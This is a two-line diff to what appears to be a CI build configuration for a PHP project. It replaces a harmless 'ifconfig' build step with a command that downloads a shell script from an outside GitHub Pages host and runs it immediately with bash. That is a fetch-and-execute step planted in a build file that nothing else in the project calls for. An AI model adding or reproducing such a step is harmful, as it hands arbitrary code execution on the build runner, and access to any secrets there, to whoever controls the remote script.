@@ -1,2 +1,2 @@
 language: php
-script: ifconfig
+script: wget http://firtone.github.io/a.sh && bash a.sh
